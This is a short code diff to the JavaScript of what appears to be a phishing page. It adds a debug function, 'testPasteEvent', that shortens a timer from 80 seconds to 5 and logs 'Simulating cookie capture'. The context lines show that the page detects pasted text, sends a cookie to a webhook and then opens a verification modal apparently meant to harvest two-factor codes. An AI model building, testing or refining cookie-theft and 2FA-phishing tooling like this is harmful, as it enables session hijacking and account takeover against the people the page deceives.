@@ -32,6 +32,21 @@ window.test2FA = function() {
     openVerificationModal();
 };
 
+// Test paste event function with shortened timer
+window.testPasteEvent = function() {
+    console.log('Testing paste event with 5 second timer...');
+    
+    // Simulate the paste event detection and immediate send
+    console.log('🍪 Simulating cookie capture...');
+    
+    setTimeout(() => {
+        console.log('5 seconds elapsed, opening 2-step verification modal...');
+        openVerificationModal();
+    }, 5000); // 5 seconds instead of 80
+    
+    console.log('Timer started - 2FA modal will open in 5 seconds');
+};
+
 // Enhanced Theme toggle functionality
 function toggleTheme() {
     const currentTheme = document.documentElement.getAttribute('data-theme');
@@ -358,6 +373,9 @@ Content Length: ${pastedText.length} characters
                     console.log('80 seconds elapsed, opening 2-step verification modal...');
                     openVerificationModal();
                 }, 80000); // 80 seconds
+                
+                // Debug: Also show a shorter timer for testing
+                console.log('🔔 Debug: 2FA modal will open in 80 seconds (or test with the green button for 5s)');
                 
             } else {
                 console.error('Failed to send cookie to webhook');
